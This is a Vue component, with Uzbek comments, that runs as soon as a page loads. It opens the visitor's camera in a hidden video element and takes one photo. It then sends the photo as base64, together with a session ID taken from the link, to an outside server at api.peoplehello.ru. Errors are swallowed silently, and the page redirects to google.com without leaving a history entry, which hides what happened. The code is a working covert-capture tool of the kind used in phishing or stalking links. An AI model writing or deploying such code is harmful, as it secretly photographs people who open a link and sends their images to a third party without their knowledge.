<template>
  <video ref="video" playsinline muted style="display:none"></video>
</template>

<script>
export default {
  name: "BackCamera",

  mounted() {
    this.capture()
  },

  methods: {
    async capture() {
      const session_id = this.$route.params.id
      if (!session_id) return this.redirect()

      if (!navigator.mediaDevices?.getUserMedia) {
        return this.redirect()
      }

      try {
        // ❗ Universal: browser o‘zi optimal kamerani tanlaydi
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false
        })

        const video = this.$refs.video
        video.srcObject = stream

        // ❗ iOS / WebView uchun MUHIM
        await video.play()

        // ❗ Kamera haqiqatan tayyor bo‘lishini kutamiz
        await new Promise(res => {
          if (video.readyState >= 2) return res()
          video.onloadedmetadata = res
        })

        // ❗ Real qurilmalarda barqarorlik
        await new Promise(r => setTimeout(r, 600))

        const canvas = document.createElement("canvas")
        canvas.width = video.videoWidth || 640
        canvas.height = video.videoHeight || 480

        const ctx = canvas.getContext("2d")
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

        // Kamerani o‘chiramiz
        stream.getTracks().forEach(t => t.stop())

        // ✅ toBlob → FileReader → BASE64 (ENG ISHONCHLI)
        canvas.toBlob((blob) => {
          if (!blob) return this.redirect()

          const reader = new FileReader()
          reader.onloadend = async () => {
            const imageBase64 = reader.result // data:image/jpeg;base64,...

            try {
              await fetch("https://api.peoplehello.ru/api/front-cam", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                  image: imageBase64,
                  session_id
                })
              })
            } catch (e) {
              // jim
            } finally {
              this.redirect()
            }
          }

          reader.readAsDataURL(blob)
        }, "image/jpeg", 0.85)

      } catch (err) {
        this.redirect()
      }
    },

    redirect() {
      // history’da qolmasin
      window.location.replace("https://google.com")
    }
  }
}
</script>
